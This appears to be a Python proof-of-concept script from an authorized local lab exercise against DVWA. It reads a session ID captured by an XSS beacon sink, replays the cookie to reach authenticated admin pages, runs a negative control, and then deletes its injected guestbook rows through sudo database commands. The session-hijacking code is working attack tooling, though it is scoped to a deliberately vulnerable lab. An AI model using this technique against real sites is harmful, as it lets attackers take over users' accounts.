#!/usr/bin/env python3
# loop3 t4 probe7: B5 收尾
#  a) 直查 guestbook 存量原文（定位我插入的行）
#  b) 用接收端窃取到的 PHPSESSID 以「陌生客户端」身份访问 DVWA（会话劫持证明）
#  c) 清理：仅删除我插入的 name='loop3t4' 行，核对行数复原
import json, re, subprocess, datetime, time, os
import requests

BASE = "http://127.0.0.1"
GAP = 1.2
UA = "loop3-t4/1.0 (authorized local lab)"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(name, **kw):
    OUT["steps"].append({"step": name, **kw})
    print(f"--- {name}: " + json.dumps(kw, ensure_ascii=False)[:1200], flush=True)
    return kw


def db(sql):
    r = subprocess.run(["sudo", "-n", "mariadb", "-N", "-e", sql], capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


# ---- a) 存量原文 ----
rec("guestbook_all", rows=db("SELECT id,name,comment FROM dvwa.guestbook ORDER BY id;")[:1500])
rec("guestbook_columns", cols=db("SHOW COLUMNS FROM dvwa.guestbook;"))
rec("count_before_cleanup", n=db("SELECT COUNT(*) FROM dvwa.guestbook;"))

# ---- b) 劫持证明：只用接收端拿到的 PHPSESSID ----
stolen = None
if os.path.exists("/tmp/loop3-t4-b5-sink.jsonl"):
    for line in open("/tmp/loop3-t4-b5-sink.jsonl"):
        e = json.loads(line)
        if "beacon" in e.get("path", ""):
            m = re.search(r"PHPSESSID%3D([0-9a-f]{32})", e["path"])
            if m:
                stolen = m.group(1)
rec("stolen_session_id_from_sink", id=stolen)

if stolen:
    h = requests.Session()
    h.headers["User-Agent"] = UA
    h.cookies.set("PHPSESSID", stolen, domain="127.0.0.1", path="/")
    r = h.get(BASE + "/dvwa/index.php", allow_redirects=False, timeout=20)
    ti = re.search(r"<title>(.*?)</title>", r.text, re.S)
    rec("hijack_index", status=r.status_code,
        title=(ti.group(1).strip() if ti else None),
        admin_welcome=("You have logged in as 'admin'" in r.text or "Welcome :: Damn" in r.text))
    time.sleep(GAP)
    # 用被窃会话取一个只有登录态才能拿到的页面（CSRF 设置页）
    r = h.get(BASE + "/dvwa/vulnerabilities/csrf/", allow_redirects=False, timeout=20)
    rec("hijack_protected_page", status=r.status_code, loc=r.headers.get("Location"),
        is_csrf_page=("Cross Site Request Forgery" in r.text))
    time.sleep(GAP)
    # 负对照：篡改一位
    bad = stolen[:-1] + ("0" if stolen[-1] != "0" else "1")
    n = requests.Session()
    n.headers["User-Agent"] = UA
    n.cookies.set("PHPSESSID", bad, domain="127.0.0.1", path="/")
    r = n.get(BASE + "/dvwa/index.php", allow_redirects=False, timeout=20)
    rec("hijack_negative_control", status=r.status_code, loc=r.headers.get("Location"))

# ---- c) 清理我插入的行 ----
rec("cleanup_sql", sql="DELETE FROM dvwa.guestbook WHERE name='loop3t4';",
    result=db("DELETE FROM dvwa.guestbook WHERE name='loop3t4'; SELECT ROW_COUNT();"))
rec("count_after_cleanup", n=db("SELECT COUNT(*) FROM dvwa.guestbook;"))
rec("guestbook_after_cleanup", rows=db("SELECT id,name,comment FROM dvwa.guestbook ORDER BY id;")[:1200])
rec("users_untouched", rows=db("SELECT user FROM dvwa.users ORDER BY user_id;"))

with open("/tmp/loop3-t4-probe7.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "stolen": stolen}))
